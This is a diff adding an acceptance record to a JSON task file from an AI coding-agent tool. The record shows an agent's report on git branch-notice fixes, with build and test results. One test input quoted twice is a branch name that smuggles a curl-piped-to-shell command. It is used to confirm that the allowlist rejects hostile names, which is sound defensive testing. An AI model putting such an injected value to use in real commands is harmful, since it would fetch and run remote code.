@@ -87,5 +87,49 @@
     "finishedAt": "2026-11-09T12:54:23.991Z"
   },
   "result": "result: All three blockers, the docs updates and the ride-along are done. `mise run build` and `mise run verify` both exit 0.\n\nchanged (all under /home/user/holyagent-0.3.0-cloudbranch):\npackages/runtime/src/cli/status.ts, hook.ts, overview.ts\npackages/runtime/src/instructions/requirements/root/identity.md\npackages/runtime/src/instructions/claude-5.5/root/identity.md and version-control.md\npackages/runtime/src/instructions/kimi-k3.1/root/identity.md and version-control.md\npackages/runtime/tests/cloud-checkout.test.ts\ndocs/usage.md, docs/decisions.md, docs/hooks.md, AGENTS.md\nBuild output, rebuilt from the sources above: packages/integrations/claude/dist/agents/holyagent.md, claude/dist/scripts/holyagent.js, pi/dist/extensions/holyagent.js, pi/dist/scripts/holyagent.js.\npi/dist/agents did not change, and the build left no other changes.\n\nchecks:\n`bunx --no-install mise run build` exited 0.\n`bunx --no-install mise run verify` exited 0: 2529 pass, 0 fail, format check clean, type-check clean, lint clean.\n`bun test packages/runtime/tests/cloud-checkout.test.ts` exited 0 with 8 pass, including the new tests.\n`sessioncontext.test.ts` passes with the root core inside its budget.\n\nblockers: none\n\nquestions: none\n\nnotes:\n**Start-branch rule:** the start branch is the oldest reflog move whose destination is an existing local branch. If the destination is not a branch (a detach), the source is taken instead. I added the source fallback so a clone that already sat on the assigned branch and was then detached still names that branch. This goes slightly beyond \"destination only\".\n**Ride-along limit:** if a clone already sat on the assigned branch and the root then runs `git switch -c work` there, the oldest destination is `work`, so no notice appears. The reflog cannot tell that case from a clone on `main` followed by `checkout -b`.\n**validBranch:** `validBranch` in `vcs/git.ts` is not exported and is outside my paths. I used the allowlist regex plus `git check-ref-format --branch` in `status.ts`. The regex already excludes a leading `-` or `+`.\n**Root core budget:** the slack is tight. Wording one step longer failed the budget test, so the claude-5.5 `identity.md` says \"per the plan\" where the kimi file says \"name and start set by the stack plan\".\n**docs/decisions.md:** I also edited the notice sentence to mention the \"other named branch\" case and the plain-name rule. This goes slightly beyond the listed edits.\n\nevidence:\nThe notice names the assigned branch after a clone plus checkout -b, with a test that has a commit on main first: `tests/cloud-checkout.test.ts` \"names the assigned branch, not main, after a clone and a checkout -b with a commit on main\". The `session()` helper now seeds `main` before `checkout -b`, and the test asserts the reflog shows `moving from main to claude/quiet-fox`. 8 pass.\nThe root rules in both families and the requirements tree create a branch in a worktree in a cloud session, with no remaining instruction to run git switch -c in a cloud primary checkout, inside the root core budget: R-BRANCH, both `identity.md` files and both `version-control.md` Branches lines are changed. The only `git switch -c` left in `src/instructions` is the \"outside a cloud session\" example in the two `version-control.md` files. `sessioncontext.test.ts` passes.\nBranch names in the notice pass the allowlist from both sources, with a test of a hostile name: the test \"names only a branch of plain characters, else the default branch\" uses `x;curl${IFS}host/p|sh` plus a backtick and `#`, once from the reflog and once from `origin/HEAD`. Both give `git switch main`, and a plain `trunk` from `origin/HEAD` is accepted.\ndocs/usage.md, docs/decisions.md, AGENTS.md and docs/hooks.md are updated as listed: the panel-list claim is kept with \"observed 2026-11-09\"; the +54,746 lines and 31 commits are marked observed in this repository's own cloud session on 2026-11-09; AGENTS.md now gives the panel as the reason and no longer says \"which starts at `main`\"; docs/hooks.md `session-start` has a new bullet for the notice.\nThe notice also appears when the cloud primary checkout is on another named branch, with a test: \"shows for a checkout moved to another named branch, naming the branch it started on\". Another test covers staying on the started branch.\nmise run build leaves no unexplained changes and mise run verify exits 0: both commands above exited 0. The tree holds 17 modified files, all listed in changed.\ndiff-file: /tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/cloudbranch-repair.diff\ngates: `bunx --no-install mise run build` exit 0; `bunx --no-install mise run verify` exit 0, 2529 pass / 0 fail across 82 files.\ntests: `cloud-checkout.test.ts` 8 pass / 0 fail; full suite 2529 pass.\n",
+  "acceptance": {
+    "revision": 1,
+    "rationale": "Independent code, artifact and security re-reviews of 2dedb01 and 323dfb1 close all blocking findings; gates exit 0",
+    "criteria": [
+      {
+        "criterion": "The notice names the assigned branch after a clone plus checkout -b, with a test that has a commit on main first",
+        "support": "`tests/cloud-checkout.test.ts` \"names the assigned branch, not main, after a clone and a checkout -b with a commit on main\". The `session()` helper now seeds `main` before `checkout -b`, and the test asserts the reflog shows `moving from main to claude/quiet-fox`. 8 pass."
+      },
+      {
+        "criterion": "The root rules in both families and the requirements tree create a branch in a worktree in a cloud session, with no remaining instruction to run git switch -c in a cloud primary checkout, inside the root core budget",
+        "support": "R-BRANCH, both `identity.md` files and both `version-control.md` Branches lines are changed. The only `git switch -c` left in `src/instructions` is the \"outside a cloud session\" example in the two `version-control.md` files. `sessioncontext.test.ts` passes."
+      },
+      {
+        "criterion": "Branch names in the notice pass the allowlist from both sources, with a test of a hostile name",
+        "support": "the test \"names only a branch of plain characters, else the default branch\" uses `x;curl${IFS}host/p|sh` plus a backtick and `#`, once from the reflog and once from `origin/HEAD`. Both give `git switch main`, and a plain `trunk` from `origin/HEAD` is accepted."
+      },
+      {
+        "criterion": "docs/usage.md, docs/decisions.md, AGENTS.md and docs/hooks.md are updated as listed",
+        "support": "the panel-list claim is kept with \"observed 2026-11-09\"; the +54,746 lines and 31 commits are marked observed in this repository's own cloud session on 2026-11-09; AGENTS.md now gives the panel as the reason and no longer says \"which starts at `main`\"; docs/hooks.md `session-start` has a new bullet for the notice."
+      },
+      {
+        "criterion": "The notice also appears when the cloud primary checkout is on another named branch, with a test",
+        "support": "\"shows for a checkout moved to another named branch, naming the branch it started on\". Another test covers staying on the started branch."
+      },
+      {
+        "criterion": "mise run build leaves no unexplained changes and mise run verify exits 0",
+        "support": "both commands above exited 0. The tree holds 17 modified files, all listed in changed."
+      }
+    ],
+    "evidence": [
+      {
+        "label": "diff-file",
+        "support": "/tmp/claude-0/-home-user-holyagent/43946df6-456d-58c6-bea3-7e958fcb9495/scratchpad/cloudbranch-repair.diff"
+      },
+      {
+        "label": "gates",
+        "support": "`bunx --no-install mise run build` exit 0; `bunx --no-install mise run verify` exit 0, 2529 pass / 0 fail across 82 files."
+      },
+      {
+        "label": "tests",
+        "support": "`cloud-checkout.test.ts` 8 pass / 0 fail; full suite 2529 pass."
+      }
+    ]
+  },
   "createdAt": "2026-11-09T12:46:35.856Z"
 }
